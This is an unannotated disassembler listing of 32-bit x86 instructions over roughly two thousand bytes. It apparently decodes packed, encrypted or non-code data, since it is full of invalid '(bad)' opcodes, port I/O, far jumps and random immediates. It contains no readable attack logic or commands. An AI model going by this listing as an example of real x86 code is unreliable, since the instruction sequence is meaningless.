  41204b:	imul   edx,DWORD PTR [ebx],0xffffffdd
  41204e:	aaa    
  41204f:	repnz inc esi
  412051:	outs   dx,BYTE PTR ds:[esi]
  412052:	pop    ds
  412053:	inc    esi
  412054:	repz ret 0xce66
  412058:	out    0x6a,eax
  41205a:	and    eax,0x47e4a2fb
  41205f:	in     eax,dx
  412060:	jmp    FWORD PTR [edi-0x149651fa]
  412066:	jge    0x412024
  412068:	enter  0xe067,0x86
  41206c:	and    eax,0xa54070d1
  412071:	push   ebp
  412072:	jnp    0x412029
  412074:	mov    dl,0x18
  412076:	add    BYTE PTR ds:0x4ceab548,dl
  41207c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41207d:	mov    edi,gs
  41207f:	cmp    eax,esp
  412081:	add    al,0x21
  412083:	cmc    
  412084:	fcomi  st,st(6)
  412086:	or     cl,bh
  412088:	push   eax
  412089:	xor    BYTE PTR [ebp-0x79],ah
  41208c:	mov    dh,0x3f
  41208e:	fs jae 0x41201f
  412091:	cmp    al,0x62
  412093:	fs inc edx
  412095:	adc    BYTE PTR [esi+0x450ebc1],dh
  41209b:	popf   
  41209c:	lods   eax,DWORD PTR ds:[esi]
  41209d:	xchg   ebx,eax
  41209e:	sub    al,0x22
  4120a0:	cmp    al,0xad
  4120a2:	dec    ebx
  4120a3:	mov    ds:0xdb197acd,al
  4120a8:	loop   0x41210f
  4120aa:	or     eax,DWORD PTR [ecx]
  4120ac:	ja     0x41206e
  4120ae:	leave  
  4120af:	fdiv   QWORD PTR [edx]
  4120b1:	mov    es,ecx
  4120b3:	xchg   BYTE PTR [ebp+0x836474],ah
  4120b9:	mulps  xmm3,xmm5
  4120bc:	mov    bl,BYTE PTR [ebx+0x76c155c0]
  4120c2:	cmp    BYTE PTR [esp+ebp*8],ah
  4120c5:	push   es
  4120c6:	gs push eax
  4120c8:	cmp    al,0xb5
  4120ca:	xlat   BYTE PTR ds:[ebx]
  4120cb:	jmp    0xcc791a2e
  4120d0:	sub    eax,0x63d45a7b
  4120d5:	or     ebx,edi
  4120d7:	out    0xae,al
  4120d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4120da:	jbe    0x412117
  4120dc:	daa    
  4120dd:	fisubr DWORD PTR [esi+0x70]
  4120e0:	sbb    BYTE PTR [esi+0x157dc52e],0xfb
  4120e7:	mov    esp,0x635a295b
  4120ec:	mov    WORD PTR [edx+0x354ac2a0],?
  4120f2:	jbe    0x412104
  4120f4:	js     0x412118
  4120f6:	mov    edi,0x65d369d3
  4120fb:	je     0x4120af
  4120fd:	pop    ebx
  4120fe:	fnstenv [eax+edx*2-0x18]
  412102:	mov    ds:0x9c6cbd7d,al
  412107:	xchg   ebx,eax
  412108:	fnstsw WORD PTR [ecx]
  41210a:	mov    esp,0xcf64cbf9
  41210f:	retf   0xfae
  412112:	mov    ebx,0x596b2e50
  412117:	in     al,0xc0
  412119:	add    DWORD PTR [edx+0x3fcdff9e],ebp
  41211f:	dec    edi
  412120:	adc    BYTE PTR ds:0x9e847dee,al
  412126:	pop    eax
  412127:	dec    ebx
  412128:	rcl    dl,1
  41212a:	(bad)  
  41212b:	fld    QWORD PTR [ecx-0x4e]
  41212e:	pop    esi
  41212f:	sbb    al,0x56
  412131:	je     0x412127
  412133:	add    DWORD PTR [ecx],edi
  412135:	out    0x88,eax
  412137:	(bad)  
  412138:	repz dec edx
  41213a:	shl    DWORD PTR [edi+ebx*4+0x5897ba83],0xf0
  412142:	push   ds
  412143:	xchg   esp,eax
  412144:	adc    al,0xc6
  412146:	imul   esi,DWORD PTR [ebp-0x2ae0716f],0xa794aec4
  412150:	jne    0x4121a9
  412152:	test   BYTE PTR [ecx+edi*2],dl
  412155:	dec    esp
  412156:	dec    esi
  412157:	fiadd  DWORD PTR [edx-0x1b1f0e13]
  41215d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41215e:	inc    eax
  41215f:	push   es
  412160:	idiv   esp
  412162:	ror    ebx,cl
  412164:	mov    bl,0xc6
  412166:	test   BYTE PTR [edx],dh
  412168:	fisttp WORD PTR [edi]
  41216a:	stos   DWORD PTR es:[edi],eax
  41216b:	aaa    
  41216c:	mov    al,0x3c
  41216e:	stc    
  41216f:	aam    0x4f
  412171:	fstp   st(1)
  412173:	pop    es
  412174:	dec    esp
  412175:	sbb    BYTE PTR [edx-0x80fa4f],dh
  41217b:	xchg   ecx,eax
  41217c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41217d:	lods   al,BYTE PTR ds:[esi]
  41217e:	mov    cl,0x24
  412180:	lahf   
  412181:	pop    ebp
  412182:	clc    
  412183:	cmp    ebp,ebp
  412185:	xchg   esp,eax
  412186:	xchg   DWORD PTR [ebp-0x65],ecx
  412189:	or     eax,0x7b1810f1
  41218e:	push   esp
  41218f:	int    0x4b
  412191:	sbb    al,0xea
  412193:	loope  0x4121dd
  412195:	cmc    
  412196:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412197:	jne    0x4121d2
  412199:	mov    ds:0xfabecd10,al
  41219e:	cmp    BYTE PTR [ecx+0x45556a6c],ah
  4121a4:	ret    0x177
  4121a7:	jl     0x41221e
  4121a9:	lahf   
  4121aa:	jae    0x412206
  4121ac:	lock fwait
  4121ae:	sub    al,0x65
  4121b0:	adc    al,BYTE PTR [ecx+0x28]
  4121b3:	mov    dl,0xa2
  4121b5:	xor    DWORD PTR [edi+0x1c91bff1],eax
  4121bb:	test   eax,0x6c244008
  4121c0:	adc    ecx,DWORD PTR [edx-0x33]
  4121c3:	imul   edi,DWORD PTR [ecx-0x3c],0x692531ac
  4121ca:	das    
  4121cb:	sub    esi,DWORD PTR [eax]
  4121cd:	shl    DWORD PTR [ebx-0x31],1
  4121d0:	and    eax,0x203b80e1
  4121d5:	adc    BYTE PTR [ebx+0x3433f11c],al
  4121db:	jge    0x412162
  4121dd:	push   ss
  4121de:	in     al,0x5b
  4121e0:	mov    es,WORD PTR [ecx]
  4121e2:	jo     0x4121c7
  4121e4:	sahf   
  4121e5:	pop    ds
  4121e6:	xchg   ebx,eax
  4121e7:	jns    0x4121b3
  4121e9:	aaa    
  4121ea:	hlt    
  4121eb:	ja     0x4121ef
  4121ed:	out    0x50,al
  4121ef:	popf   
  4121f0:	mov    ds:0xf3be2614,al
  4121f5:	stc    
  4121f6:	xchg   edi,eax
  4121f7:	mov    ds:0x49c89d8a,al
  4121fc:	mov    edi,?
  4121fe:	(bad)  
  412200:	out    dx,al
  412201:	adc    ah,BYTE PTR [edx]
  412203:	xor    DWORD PTR [edi],ebp
  412205:	jp     0x4121ec
  412207:	and    BYTE PTR [ecx],ah
  412209:	not    BYTE PTR [ebx+0x1c]
  41220c:	mov    ds:0xb5f5457a,al
  412211:	cmp    DWORD PTR [ebx-0x1a5aa72],0x82e3f532
  41221b:	mov    bh,0xd9
  41221d:	pop    edx
  41221e:	cli    
  41221f:	jbe    0x41226d
  412221:	mov    ebx,0xc11639dd
  412226:	push   es
  412227:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412228:	push   ebx
  412229:	mov    bl,0xdc
  41222b:	movd   DWORD PTR [eax+0x9],mm7
  41222f:	xchg   DWORD PTR [ebx],esp
  412231:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412232:	pop    ds
  412233:	jl     0x4121b9
  412235:	fldenv [eax]
  412237:	in     eax,0x25
  412239:	sbb    eax,DWORD PTR [esi+0x6528d659]
  41223f:	call   0xb6662a3d
  412244:	mov    bl,0xe4
  412246:	fsub   st,st(6)
  412248:	mov    bl,BYTE PTR [ecx+0x43]
  41224b:	mov    bl,0x22
  41224d:	adc    eax,0xa24210f1
  412252:	ss jge 0x41227a
  412255:	repnz loop 0x4122c6
  412258:	cs jg  0x4122b5
  41225b:	retf   
  41225c:	dec    esi
  41225d:	cs jecxz 0x4121e4
  412260:	les    edi,FWORD PTR [edx-0x3]
  412263:	or     dh,0x18
  412266:	add    BYTE PTR [ecx+0x54],bl
  412269:	cmp    al,BYTE PTR [esi-0x58b5a655]
  41226f:	ins    BYTE PTR es:[edi],dx
  412270:	mov    ebx,0x8a40fa5c
  412275:	push   0xcceeec3b
  41227a:	mov    bh,0x1e
  41227c:	retf   0x4434
  41227f:	retf   
  412280:	dec    esi
  412281:	add    BYTE PTR [edi+ebx*1+0x58],0x59
  412286:	iret   
  412287:	imul   eax,DWORD PTR [ebx-0xabf9231],0xffffff8d
  41228e:	sub    al,0x95
  412290:	mov    dh,0x79
  412292:	aas    
  412293:	cmp    cl,dl
  412295:	(bad)  [ebx]
  412297:	sub    esi,ebp
  412299:	or     al,0x46
  41229b:	iret   
  41229c:	mov    ah,0xa9
  41229e:	pop    esp
  41229f:	xlat   BYTE PTR ds:[ebx]
  4122a0:	push   0x8eeafd6a
  4122a5:	mov    ds:0x5b8aa804,al
  4122aa:	push   edx
  4122ab:	mov    WORD PTR [ebx+0x4b3067a9],?
  4122b1:	sub    ah,cl
  4122b3:	jmp    0xbdca556f
  4122b8:	mov    cl,0x61
  4122ba:	lds    ebx,FWORD PTR [eax-0x21]
  4122bd:	jmp    0xa5bc0904
  4122c2:	int    0x85
  4122c4:	cmp    eax,0xbfe00793
  4122c9:	fdivr  DWORD PTR ds:0x1de7fe72
  4122cf:	mov    al,ds:0x28207f02
  4122d4:	(bad)  
  4122d5:	cld    
  4122d6:	and    BYTE PTR [edx-0xf86d7a6],cl
  4122dc:	mov    edx,ebp
  4122de:	jle    0x4122ae
  4122e0:	sub    DWORD PTR [ebx],ecx
  4122e2:	lods   al,BYTE PTR ds:[esi]
  4122e3:	or     BYTE PTR [ebp+0x1b2a07f1],0x17
  4122ea:	mov    ebp,0x94e440e7
  4122ef:	adc    ah,BYTE PTR [edi]
  4122f1:	outs   dx,BYTE PTR ds:[esi]
  4122f2:	dec    esi
  4122f3:	jb     0x412347
  4122f5:	push   esp
  4122f6:	mov    ecx,0xf39e85be
  4122fb:	xchg   esi,eax
  4122fc:	test   edi,ebx
  4122fe:	sahf   
  4122ff:	jge    0x412340
  412301:	pusha  
  412302:	jmp    0x99a095f
  412307:	in     eax,0x74
  412309:	jo     0x4122b8
  41230b:	xor    ebp,DWORD PTR [edx+0x5a00e6b0]
  412311:	pop    es
  412312:	ret    
  412313:	scas   al,BYTE PTR es:[edi]
  412314:	popf   
  412315:	cmp    BYTE PTR [ecx],ch
  412317:	dec    esi
  412318:	mov    ecx,0xdf06f572
  41231d:	sub    DWORD PTR [ebx+0x78720ca5],eax
  412323:	dec    ebx
  412324:	jl     0x412315
  412326:	pop    edi
  412327:	mov    bl,0xd5
  412329:	lahf   
  41232a:	mov    bh,0xac
  41232c:	sbb    al,0x65
  41232e:	loope  0x412394
  412330:	dec    ecx
  412331:	ret    0x142c
  412334:	sub    eax,DWORD PTR [edi+0x5cd5cb41]
  41233a:	jge    0x4122ec
  41233c:	jmp    0x8655b881
  412341:	das    
  412342:	push   ds
  412343:	sub    DWORD PTR [ebx-0x12],esi
  412346:	imul   ebp,DWORD PTR [esi+ebp*8],0xc2c5ea1a
  41234d:	jmp    0xccaa:0x6dbcf31
  412354:	jmp    FWORD PTR [ebx-0x7b]
  412357:	adc    al,0x56
  412359:	daa    
  41235a:	push   esi
  41235b:	test   dl,ch
  41235d:	imul   edx,DWORD PTR [eax-0x39d1f10a],0x65
  412364:	mov    dh,0x1a
  412366:	scas   eax,DWORD PTR es:[edi]
  412367:	(bad)  
  412368:	sbb    cl,BYTE PTR [ebx-0x21518c69]
  41236e:	stos   BYTE PTR es:[edi],al
  41236f:	cmp    DWORD PTR [edi],ebx
  412371:	sub    al,0x7c
  412373:	lods   eax,DWORD PTR ds:[esi]
  412374:	push   0xd22a5d10
  412379:	mov    ebx,fs
  41237b:	idiv   DWORD PTR [edi-0x14]
  41237e:	mov    ah,0x55
  412380:	xor    eax,0xe00e1d2d
  412385:	ins    DWORD PTR es:[edi],dx
  412386:	cmc    
  412387:	pop    edi
  412388:	push   edx
  412389:	outs   dx,DWORD PTR ds:[esi]
  41238a:	and    DWORD PTR [ebp-0x66],edi
  41238d:	in     al,0xe2
  41238f:	cmp    esp,DWORD PTR [ecx+0x9]
  412392:	(bad)  
  412393:	loop   0x41238a
  412395:	cmp    edx,edi
  412397:	out    0xf6,eax
  412399:	popa   
  41239a:	ret    
  41239b:	(bad)  
  41239d:	mov    edx,esp
  41239f:	pushf  
  4123a0:	xor    bh,BYTE PTR [ebp+0x3598e69d]
  4123a6:	jge    0x412388
  4123a8:	xchg   DWORD PTR [esi],ecx
  4123aa:	retf   0xe879
  4123ad:	push   cs
  4123ae:	ins    DWORD PTR es:[edi],dx
  4123af:	inc    edi
  4123b0:	jno    0x4123b7
  4123b2:	aad    0x13
  4123b4:	in     al,0x54
  4123b6:	mov    ss,WORD PTR [edi+ebp*8]
  4123b9:	retf   
  4123ba:	cmp    bh,dh
  4123bc:	cld    
  4123bd:	repz icebp 
  4123bf:	push   ds
  4123c0:	cli    
  4123c1:	fdivr  QWORD PTR [eax-0x5397c42f]
  4123c7:	adc    DWORD PTR [ebx-0x433f1393],edx
  4123cd:	adc    eax,0xd79db49c
  4123d2:	push   ebx
  4123d3:	mov    BYTE PTR [ebx],dl
  4123d5:	xor    BYTE PTR [edx+0xc],al
  4123d8:	jbe    0x412430
  4123da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4123db:	lahf   
  4123dc:	test   eax,0x7b7011b3
  4123e1:	or     BYTE PTR ds:0x1d0f9332,cl
  4123e7:	mov    ebp,0xde9dda3a
  4123ec:	xlat   BYTE PTR ds:[ebx]
  4123ed:	dec    edx
  4123ee:	xchg   ebx,eax
  4123ef:	inc    ecx
  4123f0:	sbb    ebp,ebp
  4123f2:	in     al,dx
  4123f3:	jl     0x4123ba
  4123f5:	inc    ebx
  4123f6:	dec    ebp
  4123f7:	sub    dh,BYTE PTR [ecx-0x16]
  4123fa:	pop    esp
  4123fb:	pop    esp
  4123fc:	push   ss
  4123fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4123fe:	jne    0x412472
  412400:	cmp    BYTE PTR [edi+0x6d],dh
  412403:	mov    dh,0x10
  412405:	sbb    ch,bl
  412407:	adc    DWORD PTR [ecx+ebp*1+0xe],0xffffff94
  41240c:	jno    0x412410
  41240e:	add    dh,ah
  412410:	div    DWORD PTR [ebx-0x4cfc3cf2]
  412416:	cmp    DWORD PTR [esi+0x6bb1e7ec],eax
  41241c:	(bad)  
  41241e:	jp     0x412433
  412420:	clc    
  412421:	retf   
  412422:	aam    0xa
  412424:	adc    BYTE PTR [ebx+edi*4+0x64a99225],bh
  41242b:	outs   dx,BYTE PTR ds:[esi]
  41242c:	and    DWORD PTR [eax+ebx*1+0x71],ebp
  412430:	jecxz  0x412472
  412432:	imul   edx,DWORD PTR [ebx-0x6c16501d],0x11
  412439:	jge    0x412403
  41243b:	jecxz  0x412427
  41243d:	xor    eax,0x5a8c5d22
  412442:	mov    dl,0x8d
  412444:	ja     0x412485
  412446:	push   DWORD PTR [eax]
  412448:	fsubr  st,st(0)
  41244a:	jecxz  0x412404
  41244c:	add    eax,0x5cb95b03
  412451:	add    al,0x78
  412453:	xor    dh,dh
  412455:	shl    BYTE PTR [ebx+ebx*8-0x584610d5],cl
  41245c:	mov    ds:0x6558f3e4,eax
  412461:	std    
  412462:	xor    cl,BYTE PTR [ebp+0xc22fd62]
  412468:	jg     0x412422
  41246a:	leave  
  41246b:	addr16 popa 
  41246d:	or     al,0xdb
  41246f:	jmp    0x9ab1:0x12ed1d0
  412476:	xchg   DWORD PTR es:[ecx+0x1c],edx
  41247a:	sbb    eax,0xd5574f74
  41247f:	xlat   BYTE PTR ds:[ebx]
  412480:	jle    0x412485
  412482:	xchg   edx,eax
  412483:	ffree  st(2)
  412485:	add    al,bl
  412487:	in     al,0xdc
  412489:	fcomp  DWORD PTR [ebx+0x5]
  41248c:	push   ebx
  41248d:	imul   esp,DWORD PTR ds:0xeb7130c2,0xd27460af
  412497:	dec    eax
  412498:	xchg   esi,eax
  412499:	jge    0x41247c
  41249b:	js     0x41243e
  41249d:	mov    ds:0x79469f52,al
  4124a2:	xchg   esp,eax
  4124a3:	stc    
  4124a4:	imul   ebx,ecx,0x272e9861
  4124aa:	and    eax,0xb9d63296
  4124af:	push   ss
  4124b0:	nop
  4124b1:	jle    0x4124a9
  4124b3:	adc    eax,0x139a8147
  4124b8:	ins    DWORD PTR es:[edi],dx
  4124b9:	push   ds
  4124ba:	pop    ebp
  4124bb:	test   ebp,0xc0a734ed
  4124c1:	aas    
  4124c2:	(bad)  
  4124c3:	mov    dl,0x36
  4124c5:	jbe    0x41253b
  4124c7:	mov    ch,0x2a
  4124c9:	sbb    eax,ebp
  4124cb:	stos   BYTE PTR es:[edi],al
  4124cc:	push   ds
  4124cd:	ret    
  4124ce:	cdq    
  4124cf:	call   0x418c:0x33cede87
  4124d6:	fistp  WORD PTR [esi]
  4124d8:	xor    ah,BYTE PTR [esi-0x35]
  4124db:	mov    ebp,ebp
  4124dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4124de:	(bad)
  4124e1:	int    0x8a
  4124e3:	loopne 0x412558
  4124e5:	pop    edi
  4124e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4124e7:	push   ebx
  4124e8:	ret    0x22b0
  4124eb:	iret   
  4124ec:	in     al,dx
  4124ed:	jg     0x412544
  4124ef:	imul   esp,DWORD PTR [esi+0x1],0x17
  4124f3:	adc    DWORD PTR [ebx],edx
  4124f5:	(bad)  
  4124f6:	aad    0x59
  4124f8:	loop   0x412546
  4124fa:	scas   eax,DWORD PTR es:[di]
  4124fc:	push   0x8cfd6294
  412501:	push   ds
  412502:	xchg   ebx,eax
  412503:	xchg   BYTE PTR ds:0x5c65ede9,bl
  412509:	inc    esp
  41250a:	shl    DWORD PTR ds:0xd24fea1e,cl
  412510:	xchg   ebx,ebp
  412512:	lods   eax,DWORD PTR ds:[esi]
  412513:	jle    0x4124fa
  412515:	pop    esi
  412516:	xor    esi,edx
  412518:	mov    ebx,0x48b63888
  41251d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41251e:	xchg   edi,eax
  41251f:	mov    ah,0xa
  412521:	sbb    ch,ah
  412523:	outs   dx,BYTE PTR ds:[esi]
  412524:	push   0x7b
  412526:	cmp    al,0xae
  412528:	push   ebp
  412529:	out    0xa1,eax
  41252b:	inc    esp
  41252c:	jmp    0x4794:0xbdfe54d0
  412533:	or     eax,0x864b382
  412538:	push   cs
  412539:	sar    BYTE PTR [esi-0x9b5bcba],1
  41253f:	repnz aas 
  412541:	int    0x95
  412543:	mov    eax,ds:0xc26bd3fa
  412548:	inc    ebp
  412549:	sub    edi,DWORD PTR [ebp+0x30]
  41254c:	pop    ecx
  41254d:	add    DWORD PTR ds:0xee672c0f,ecx
  412553:	mov    BYTE PTR [ebx+0x48],dl
  412556:	stos   BYTE PTR es:[edi],al
  412557:	lock iret 
  412559:	mov    ebp,0x538e04d
  41255e:	sbb    eax,0xba6bb277
  412563:	js     0x41257b
  412565:	test   DWORD PTR [edx+0x79dd6224],edx
  41256b:	push   edi
  41256c:	jb     0x41252e
  41256e:	push   0x50b8536
  412573:	inc    edi
  412574:	push   ebx
  412575:	test   al,0xda
  412577:	addr16 aad 0x4e
  41257a:	les    ebp,FWORD PTR [eax+0x3d]
  41257d:	stos   DWORD PTR es:[edi],eax
  41257e:	xchg   BYTE PTR [ecx],ch
  412580:	jp     0x4125fc
  412582:	fwait
  412583:	adc    bl,BYTE PTR [ecx+0x5d0799fb]
  412589:	cmc    
  41258a:	leave  
  41258b:	mov    edx,DWORD PTR [di+0xe34]
  412590:	mov    bl,0xdb
  412592:	sub    al,0xf4
  412594:	dec    ecx
  412595:	aas    
  412596:	pushf  
  412597:	jne    0x4125ee
  412599:	or     BYTE PTR [edi+0x30910055],cl
  41259f:	adc    eax,0x280b5f44
  4125a4:	sub    edx,esp
  4125a6:	mov    dl,0xae
  4125a8:	enter  0xef38,0x6c
  4125ac:	nop
  4125ad:	sub    BYTE PTR [ebp-0x17d359b9],0x6e
  4125b4:	push   ecx
  4125b5:	(bad)  
  4125b6:	jno    0x412627
  4125b8:	jns    0x412607
  4125ba:	fisub  DWORD PTR [edi-0x68b33cf0]
  4125c0:	rcr    BYTE PTR [esi-0x3bf2dabe],cl
  4125c6:	push   cs
  4125c7:	cli    
  4125c8:	aas    
  4125c9:	dec    ebp
  4125ca:	dec    esp
  4125cb:	loop   0x41256e
  4125cd:	inc    ebx
  4125ce:	xor    ch,al
  4125d0:	pop    edi
  4125d1:	cld    
  4125d2:	pop    ecx
  4125d3:	push   0x2d05ae44
  4125d8:	push   ebp
  4125d9:	push   es
  4125da:	mov    ss,ebp
  4125dc:	in     al,dx
  4125dd:	inc    ebp
  4125de:	jmp    0x412600
  4125e0:	push   ss
  4125e1:	sbb    eax,0x37ab08ee
  4125e6:	popf   
  4125e7:	mov    bl,0x98
  4125e9:	aam    0x49
  4125eb:	pop    esp
  4125ec:	pop    eax
  4125ed:	sub    al,0x31
  4125ef:	daa    
  4125f0:	dec    ebp
  4125f1:	popa   
  4125f2:	and    DWORD PTR [ebp+0x1],ebp
  4125f5:	and    esi,DWORD PTR ds:0x7200e977
  4125fb:	arpl   WORD PTR ds:0x9968310c,bp
  412601:	fistp  WORD PTR [eax+eiz*8]
  412604:	push   ss
  412605:	xor    esp,ecx
  412607:	out    dx,al
  412608:	sbb    ebp,ebp
  41260a:	sti    
  41260b:	or     eax,0x7ec669c4
  412610:	(bad)  
  412611:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412612:	pop    ds
  412613:	mov    ds:0x8ab67678,al
  412618:	mov    ds:0xa6f88b64,eax
  41261e:	push   edx
  41261f:	scas   al,BYTE PTR es:[edi]
  412620:	dec    ecx
  412621:	popa   
  412622:	sub    al,0x53
  412624:	add    eax,0x7b49a84a
  412629:	fdivrp st(0),st
  41262b:	fwait
  41262c:	inc    ebx
  41262d:	ins    BYTE PTR es:[edi],dx
  41262e:	jne    0x41268c
  412630:	or     BYTE PTR [ebx-0x12],dh
  412633:	cmp    al,0x37
  412635:	lock cld 
  412637:	(bad)  
  412638:	ins    DWORD PTR es:[edi],dx
  412639:	xchg   ecx,eax
  41263a:	sub    BYTE PTR [ebx+0x2f],bl
  41263d:	adc    DWORD PTR [edi-0x7c],edx
  412640:	outs   dx,BYTE PTR ds:[esi]
  412641:	(bad)  
  412642:	fs aaa 
  412644:	mov    edi,0x10754531
  412649:	rcr    DWORD PTR [edi-0x7a],cl
  41264c:	stos   BYTE PTR es:[edi],al
  41264d:	out    0xe7,eax
  41264f:	and    eax,0x9566a041
  412654:	jp     0x412677
  412656:	mov    ds:0x42ec02d0,al
  41265b:	xor    esp,DWORD PTR [ebx+0xc8ff76e]
  412661:	xor    DWORD PTR [edi],ecx
  412663:	sar    BYTE PTR [ebx],cl
  412665:	mov    ch,0xcc
  412667:	push   es
  412668:	push   esp
  412669:	fcom   DWORD PTR [ecx+0x1e5a220e]
  41266f:	mov    ds:0x2929f85c,al
  412674:	mov    bh,BYTE PTR [edx+0x1fbab071]
  41267a:	inc    ebx
  41267b:	sbb    ecx,DWORD PTR [edi+0x1abaf836]
  412681:	cdq    
  412682:	call   0xe4945277
  412687:	popf   
  412688:	xchg   ecx,eax
  412689:	shl    DWORD PTR [edi+0x335e4be0],0xf4
  412690:	cmp    BYTE PTR [ebx],ch
  412692:	aad    0x5
  412694:	ja     0x412692
  412696:	jne    0x412684
  412698:	pop    eax
  412699:	mov    edi,0x21f4ae3e
  41269e:	loop   0x41264b
  4126a0:	fscale 
  4126a2:	call   FWORD PTR [edx]
  4126a4:	push   eax
  4126a5:	je     0x412688
  4126a7:	inc    ecx
  4126a8:	ins    DWORD PTR es:[edi],dx
  4126a9:	inc    ebx
  4126aa:	cld    
  4126ab:	jb     0x412641
  4126ad:	rcr    ebx,cl
  4126af:	push   ds
  4126b0:	dec    ebx
  4126b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4126b2:	cmp    BYTE PTR [ecx+eax*4],0xa2
  4126b6:	mov    ds:0x94876edb,eax
  4126bb:	(bad)  
  4126bc:	push   edi
  4126bd:	inc    ebx
  4126be:	pushw  ds
  4126c0:	ds push cs
  4126c2:	pop    ebx
  4126c3:	outs   dx,BYTE PTR ds:[esi]
  4126c4:	jbe    0x41264f
  4126c6:	add    DWORD PTR [eax],0xffffffd6
  4126c9:	sub    DWORD PTR [edi-0x7427b88b],eax
  4126cf:	and    BYTE PTR [edx+0x68],ah
  4126d2:	and    BYTE PTR ds:0x1925303f,al
  4126d8:	mov    BYTE PTR [edx],al
  4126da:	popa   
  4126db:	xlat   BYTE PTR ds:[ebx]
  4126dc:	xchg   edx,eax
  4126dd:	sbb    al,BYTE PTR [edx]
  4126df:	or     eax,0x88776826
  4126e4:	test   eax,0xe818f7c7
  4126e9:	sbb    dl,cl
  4126eb:	loopne 0x41272c
  4126ed:	jl     0x15c71f73
  4126f3:	cmp    al,0xfa
  4126f5:	mov    cl,0x32
  4126f7:	sbb    eax,0x3d43a94e
  4126fc:	dec    edx
  4126fd:	push   edx
  4126fe:	xchg   edi,eax
  4126ff:	cdq    
  412700:	dec    esi
  412701:	(bad)  
  412702:	std    
  412703:	or     DWORD PTR [edi+0x6fbdd349],edx
  412709:	sti    
  41270a:	retf   0xe983
  41270d:	and    DWORD PTR [ecx+0x22],edx
  412710:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412711:	fild   DWORD PTR [ecx]
  412713:	stc    
  412714:	pop    eax
  412715:	pop    esi
  412716:	cmp    DWORD PTR [edx],edi
  412718:	inc    edi
  412719:	mov    ah,0x81
  41271b:	not    DWORD PTR [ecx-0x75]
  41271e:	push   esi
  41271f:	test   eax,0x504aed19
  412724:	mov    dh,0x64
  412726:	(bad)  
  412727:	icebp  
  412728:	and    cl,BYTE PTR [ecx-0x71]
  41272b:	jae    0x4127ac
  41272d:	sti    
  41272e:	ds int 0x52
  412731:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412732:	sbb    BYTE PTR [eax+ebx*4+0x5a3c126c],dl
  412739:	mov    bl,0x2f
  41273b:	mov    eax,ds:0xe82f0153
  412740:	push   ecx
  412741:	loop   0x412704
  412743:	mov    BYTE PTR [esi+0x56],dh
  412746:	push   ds
  412747:	inc    edi
  412748:	pop    ecx
  412749:	inc    edx
  41274a:	retf   0x1636
  41274d:	fisttp QWORD PTR [ecx]
  41274f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412750:	je     0x41274b
  412752:	fwait
  412753:	push   edi
  412754:	pushf  
  412755:	stos   BYTE PTR es:[edi],al
  412756:	inc    ebx
  412757:	clc    
  412758:	pop    esp
  412759:	icebp  
  41275a:	test   BYTE PTR cs:[ecx+0x44],ch
  41275e:	sti    
  41275f:	xor    BYTE PTR [ebp+0xd],bh
  412762:	xchg   edi,eax
  412763:	adc    BYTE PTR [edi-0x7e936c86],bl
  412769:	mov    al,0x35
  41276b:	adc    DWORD PTR [ebp+0x5ba1802d],ecx
  412771:	cmp    BYTE PTR ds:0xb506eadf,cl
  412777:	dec    edx
  412778:	(bad)  
  412779:	push   edx
  41277a:	push   0xa45ec68c
  41277f:	jg     0x41270b
  412781:	rcl    DWORD PTR [edx+ebx*2],1
  412784:	cmp    ah,bh
  412786:	movd   DWORD PTR [eax+ecx*4+0x7bc69533],mm7
  41278e:	(bad)  
  41278f:	aad    0xfa
  412791:	pop    eax
  412792:	mov    ebx,0x1db4eb90
  412797:	js     0x4127c1
  412799:	or     DWORD PTR [edi-0x50],ebp
  41279c:	in     eax,0x54
  41279e:	jmp    0xa9b6:0x1ad97fcf
  4127a5:	mov    dl,0x4a
  4127a7:	xchg   ebp,eax
  4127a8:	gs add al,0xe3
  4127ab:	adc    dh,BYTE PTR [esi]
  4127ad:	inc    edx
  4127ae:	xchg   ebp,eax
  4127af:	pop    edx
  4127b0:	jmp    0xd2a1:0x863762e0
  4127b7:	xchg   edx,eax
  4127b8:	cmp    al,0x73
  4127ba:	sub    ch,ah
  4127bc:	stos   BYTE PTR es:[edi],al
  4127bd:	loope  0x412771
  4127bf:	retf   0xa6f1
  4127c2:	scas   al,BYTE PTR es:[edi]
  4127c3:	xor    eax,0xb1b500d3
  4127c8:	in     eax,0xaf
  4127ca:	rep ins BYTE PTR es:[edi],dx
  4127cc:	push   ecx
  4127cd:	aas    
  4127ce:	jecxz  0x412759
  4127d0:	mov    edx,DWORD PTR [esi+ebp*8+0x601de260]
  4127d7:	pop    ss
  4127d8:	enter  0x9289,0x67
  4127dc:	pop    edx
  4127dd:	mov    al,ds:0xc0023d37
  4127e2:	repnz and esi,DWORD PTR [ecx-0x579b222f]
  4127e9:	lods   al,BYTE PTR ds:[esi]
  4127ea:	(bad)
  4127ed:	or     eax,0x443c31de
  4127f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127f3:	ret    
  4127f4:	xchg   edx,eax
  4127f5:	out    dx,eax
  4127f6:	hlt    
  4127f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4127f8:	jnp    0x4127bc
  4127fa:	or     DWORD PTR [edx+0x61d74cec],edi
  412800:	mov    WORD PTR [esi],ds
  412802:	les    ebx,FWORD PTR [edi-0x60]
  412805:	popf   
  412806:	sub    bl,al
  412808:	dec    ecx
  412809:	js     0x412864
  41280b:	adc    eax,0xe72f0e74
  412810:	fdiv   st(2),st
  412812:	push   0xffffffcf
  412814:	cmp    edx,ebp
  412816:	pop    es
  412817:	cmc    
